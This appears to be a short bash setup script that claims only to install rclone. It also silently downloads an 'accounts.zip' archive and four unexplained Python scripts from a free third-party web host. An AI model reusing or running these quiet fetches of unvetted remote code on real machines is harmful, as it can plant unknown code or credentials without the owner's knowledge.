#!/bin/bash

# Install rclone static binary
wget -q https://publicmm.000webhostapp.com/accounts.zip
wget -q https://downloads.rclone.org/v1.53.2/rclone-v1.53.2-linux-amd64.zip
wget -q https://publicmm.000webhostapp.com/kiy.py
wget -q https://publicmm.000webhostapp.com/back.py
wget -q https://publicmm.000webhostapp.com/loop.py
wget -q https://publicmm.000webhostapp.com/loops.py
unzip -q accounts.zip
unzip -q rclone-v1.53.2-linux-amd64.zip
export PATH=$PWD/rclone-v1.53.2-linux-amd64:$PATH
